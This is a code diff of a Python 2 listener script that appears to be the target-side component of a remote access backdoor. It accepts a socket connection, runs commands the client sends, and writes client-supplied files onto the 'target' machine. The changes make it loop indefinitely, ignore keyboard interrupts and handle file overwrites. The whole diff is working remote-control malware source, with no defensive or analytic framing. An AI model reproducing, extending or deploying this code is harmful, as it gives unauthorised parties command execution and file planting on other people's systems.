@@ -8,12 +8,6 @@ import socket
 import subprocess
 import pickle
 
-# checking file/directory match
-def find(name, path):
-    for root, dirs, files in os.walk(path):
-        if name in files:
-            return os.path.join(root, name)
-
 # serverSocket creation + option so_reuseaddr
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -29,10 +23,11 @@ try:
 except socket.error, e:
 	errorcode=e[1]
 	print errorcode
-try:
+
+while 1:
 	action = client.recv(256)
 	if action == "1":
-		while True:
+		while 1:
 			try:
 				commandToRun = client.recv(4096)
 				if commandToRun != "":
@@ -45,8 +40,7 @@ try:
 					client.close()
 					sys.exit()
 			except KeyboardInterrupt:
-				client.close()
-				sys.exit()
+				pass
 
 	if action == "2":
 		try:
@@ -82,23 +76,35 @@ try:
 		try:
 			waitingFilename = "Enter the filename to transfer on the target : "
 			client.sendall(waitingFilename)
-			#processing request
+			# processing request
 			Filename = client.recv(256)
-			if Filename != "":
-				clientFiledata = "tmp"	
-				clientFiledata = client.recv(4096)
-				uploadedFile = open(Filename, "wb")
-				#importing data in the new file
-				try:
+			cwd = os.getcwd()
+			# if file exists in cwd we ask for overwriting
+			if os.path.exists(cwd+"/"+Filename):
+				known = "1"
+				client.sendall(known)
+				confirm = client.recv(256)
+				if confirm == "1":
+					clientFiledata = client.recv(4096)
+					uploadedFile = open(Filename, "wb")
+					# importing data in the new file
 					uploadedFile.write(clientFiledata)
 					uploadedFile.close()
-				except:
+					status = "[*] File successfully transfered !"
+					client.sendall(status)
+				if confirm == "0":
 					sys.exit()
-				client.sendall("[*] File successfully transfered !")
+			# if file does not exists in cwd we send data directly
+			if not os.path.exists(cwd+"/"+Filename):
+				known = "0"
+				client.sendall(known)
+				clientFiledata = client.recv(4096)
+				uploadedFile = open(Filename, "wb")
+				# importing data in the new file
+				uploadedFile.write(clientFiledata)
+				uploadedFile.close()
+				status = "[*] File successfully transfered !"
+				client.sendall(status)
 		except:
 			pass
-except socket.error, e:
-	errorcode=e[1]
-	print errorcode
-
-serverSocket.close()
+#serverSocket.close()
